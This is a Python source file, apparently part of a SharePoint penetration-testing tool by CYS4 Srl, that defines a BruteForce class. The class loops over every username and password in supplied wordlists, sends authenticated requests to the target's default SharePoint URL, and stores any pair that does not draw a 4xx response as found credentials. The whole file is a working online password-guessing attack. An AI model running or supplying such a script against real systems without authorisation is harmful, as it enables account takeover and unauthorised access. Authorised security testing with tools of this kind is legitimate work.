#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Copyright (C) 2020 CYS4 Srl
See the file 'LICENSE' for copying permission
"""

from os import path

from libs.core.logger import Logger
from libs.core.request import Request
from libs.core.target import Target
import libs.core.constants as constants


class BruteForce:
    
    _instance = None
    logger = None
    target = None
    request = None
    domain = None
    dict_user = None
    dict_password = None

    def __new__(cls, domain, dict_user, dict_password):
        # Creating Logger as a Singleton and init the colored output
        if cls._instance is None:
            cls._instance = super(BruteForce, cls).__new__(cls)
            cls._instance.init_bruteforce(domain, dict_user, dict_password)
        return cls._instance

    def init_bruteforce(self, domain, dict_user, dict_password):
        self.logger = Logger().get_logger()
        self.target = Target()
        self.request = Request()
        self.domain = domain
        self.dict_user = dict_user
        self.dict_password = dict_password
        self.logger.debug("init_bruteforce")

    def bruteforce(self):
        self.logger.debug("Starting bruteforce")

        url = "%s%s" % (self.target.url,constants.SHAREPOINT_DEFAULT_URL)
        if not path.exists(self.dict_user):
            raise ValueError("User file does not exists (wrong path?)")
        if not path.exists(self.dict_password):
            raise ValueError("Password file does not exists (wrong path?)")

        file_user = open(self.dict_user, "r")
        file_password = open(self.dict_password, "r")

        # save the current session
        tmp = self.request.session

        # Starting bruteforce
        for user in file_user:
            user = user.rstrip()
            for passwd in file_password:
                passwd = passwd.rstrip()

                # create a new session for each request
                self.request.init_requests(self.domain, user, passwd)

                try:
                    r = self.request.request_get(url)
                    if str(r.status_code)[0] != '4':
                        self.logger.debug("Found user and password: %s - %s" % (user, passwd))
                        self.target.credentials.append({"username":user,"password":passwd})
                except Exception as e:
                    raise ValueError("Unhandled error during running the brute force.")

            # restore the index of the file
            file_password.seek(0)

        # restore the old session
        self.request.session = tmp

        file_user.close()
        file_password.close()
